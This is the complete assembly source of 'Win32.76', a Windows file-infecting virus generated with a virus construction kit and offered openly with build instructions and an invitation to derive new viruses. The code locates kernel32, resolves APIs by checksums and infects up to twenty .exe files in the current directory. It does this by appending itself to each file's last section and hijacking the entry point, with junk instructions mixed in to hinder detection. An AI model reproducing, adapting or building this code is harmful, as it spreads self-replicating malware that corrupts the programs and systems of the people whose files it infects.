              
;
;
; Win32.76 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.76
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 76
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 12
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
 sub edx, offset Delta
 not ebx                                ; Trash
                                        ; mov ebp, edx
 mov ebp, edx
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov ebx, ebp
 add ebx, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 dec ecx
 inc ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop edi
                                        ; retrieve PE - Header
 mov esi, edi
 add esi, [edi+3Ch]
                                        ; get File Alignment
 mov ecx, [esi+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 and dword ptr [ebp+Trash1], 84371      ; Trash
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
                                        ; clear esi
 push 0
 pop esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 adc dword ptr [ebp+Trash1], ebx        ; Trash
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
 movzx ecx, word ptr [esi+06h]
 dec ecx
 imul ecx, ecx, 28h
                                        ; add edx, 120
 add edx, 120d
 add edx, ecx
 mov eax, dword ptr [esi+74h]
 sal eax, 3
 add edx, eax
 inc ecx                                ; Trash
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov eax, dword ptr [esi+34h]
 add dword ptr [ebp+Trash1], 1425609    ; Trash
 mov dword ptr [ebp+OldBase], eax
                                        ; clear ebx
 sub ebx, ebx

 add ebx, [edx+10h]
                                        ; mov ecx, ebx
 mov ecx, ebx
 add edx, 14h
 add ebx, [edx]
 sub edx, 14h
 push ebx
 mov eax, ecx
 add edx, 0Ch
 add eax, [edx]
 sub edx, 0Ch
 mov dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 mov eax, 0

 add eax, [edx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 dec dword ptr [ebp+Trash1]             ; Trash
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], 0h
 add dword ptr [edx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+0Ch]
 add eax, dword ptr [edx+10h]
 and dword ptr [ebp+Trash1], 1126205    ; Trash
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '76'
                                        ; Append Virus
 pop edi
 lea esi, [ebp+Virus]
 sal ecx, 28d                           ; Trash

 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize
 shr ecx, 7d                            ; Trash

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], -1
 sub dword ptr [ebp+Trash1], eax        ; Trash
 and dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov esi, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov esi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov esi, 077e00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 and ecx, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 lea edx, [ebp+GetKernel32Exception]
 xchg edx, ecx

 push ecx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
 add dword ptr [ebp+Trash1], ebx        ; Trash
 mov ebx, dword ptr [ebp+K32Trys]
 rcl eax, 8d                            ; Trash
 cmp ebx, 0h
 jnz GotKernelXX
 jmp GetKernel32NotFound
GotKernelXX:
 not edx                                ; Trash
                                        ; check for ZM
 movzx ebx, word ptr [esi]
 sub ebx, 'ZM'
 jz CheckPE

GK2:
 sub esi, 65536d
 inc dword ptr [ebp+K32Trys]
 adc dword ptr [ebp+Trash1], 126562     ; Trash
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov edx, [esi]
 sub esi, 60d
 add edx, esi
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 add edx, 22d
                                        ; clear ecx
 mov ecx, 4483d
 sub ecx, 4483d
 movzx ecx, word ptr [edx]
 and cx, 0F000h
 cmp cx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 add edx, -22d


KernelFound:
 push esi
 pop dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+KernelPE], edx

                                        ; clear eax
 and eax, 0

 pop dword ptr fs:[eax]
 pop ecx
 popad
 clc
ret

 dec ecx                                ; Trash
GetKernel32Exception:
                                        ; clear eax
 push 0
 pop eax

 or edx, edx                            ; Trash
 mov edx, dword ptr fs:[eax]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear edx
 push 0
 pop edx

 pop dword ptr fs:[edx]
 pop eax
 popad
 stc
ret


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov dword ptr [ebp+Trash1], ecx        ; Trash
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
 shl ecx, 19d                           ; Trash
ret
 mov edx, 25233240d                     ; Trash


FindNextFileProc:                       ; find another file
 shl edx, 6d                            ; Trash
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret
 xor edx, ebx                           ; Trash


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, ( 276d - 32d )
 add eax, 32d
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ecx

 ror ebx, 6d                            ; Trash
 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi


 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [esi+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 dec edi
 add edi, 29d
                                        ; get ATableVA
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
                                        ; add edi, 4
 inc edi
 add edi, 3d
 mov dword ptr [ebp+ATableVA], esi
                                        ; get NTableVA
 mov esi, dword ptr [edi]
                                        ; add edi, 4
 dec edi
 add edi, 5d
 rcl edx, 13d                           ; Trash
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; get OTableVA
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 mov ebx, ebp
 add ebx, offset APINames
 adc edx, eax                           ; Trash

 lea edi, [ebp+APIOffsets]
 xchg edi, esi


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], edx
                                        ; add esi, 4
 add esi, 4d
 sub ecx, 1
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 pop dword ptr [ebp+NTableTemp]
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
                                        ; mov edx, ecx
 mov edx, ecx
                                        ; mov edi, ecx
 mov edi, ecx
 push edi
 mov dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 mov eax, dword ptr [ebx]
 LoopChsksm:
                                        ; clear ecx
 mov ecx, 0
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 clc 
 sal cx,8d
 adc dword ptr [ebp+Trash1], 361242     ; Trash
 sub eax, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 and ecx, 0
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 sub eax, ecx
 cmp cx, 0
 jne LoopChsksm
LoopConti:
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 mov edx, dword ptr [ebp+NTableTemp]
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+TempApisearch3]
                                        ; add edx, 4
 add edx, 4d
 sub word ptr [ebp+counter], -1
 sub ecx, ecx                           ; Trash
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1
 xor eax, 65017220d                     ; Trash

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop edx
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [edx]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ecx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea eax, [ebp+WFD_szFileName]
 xchg eax, esi

 push esi
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 shl edx, 11d                           ; Trash
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 cmp eax, 0
 je CloseFile
 or edx, ebx                            ; Trash
                                        ; clear edx
 mov edx, 42933d
 sub edx, 42933d
 push ebx
 push edx
 push edx
                                        ; mov ecx, 2
 mov ecx, 0
 add ecx, 2d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 sub eax, 1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx
 add edx, eax                           ; Trash

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, ecx


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [edi]
 sal ecx, 1d                            ; Trash
 sub edx, 'ZM'
 jz Goodfile
                                        ; mov ecx, 8307
 mov ecx, ( 8307d - 2d )
 add ecx, 2d
 test ecx, ecx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [edi+3Ch]
 shl ebx, 6d                            ; Trash
 pop ecx
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
 add ebx, 42750540d                     ; Trash
                                        ; clear eax
 xor eax, eax
 dec eax
 inc eax
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '76'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [ecx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [ecx+16h]
 and dx, 00002h
 add eax, 18367694d                     ; Trash
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, eax

 push eax
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 AlignReg2   dd 0h
 NewSize     dd 0h
 OldBase     dd 400000h
 KernelPE    dd 0h
 MapAddress  dd 0h
 Attributes  dd 0h
 TempAPI     dd 0h
 NewEIP      dd 0h
 TempApisearch3 dd 0h
 FindHandle  dd 0h
 OldEIP      dd 0h
 NTableTemp  dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XGetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h

 ATableVA    dd 0h
 K32Trys     dd 0h
 InfCounter  dd 0h
 db 'Win32.76 of SnakeByte',0
 MapHandle   dd 0h
 counter     dw 0h
 Trash1      dd 0h
 FileHandle  dd 0h
 filemask    db '*.Exe',0
 NTableVA    dd 0h
 KernelMZ    dd 0h
 Trash2      dd 0h
 AlignReg1   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APINames:
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h

 OTableVA    dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop ebx

 mov dword ptr [ebp+retBase], ebx

 push dword ptr [ebp+OldEIP]
 pop eax

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], eax

 sar ebx, 19d                           ; Trash


ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

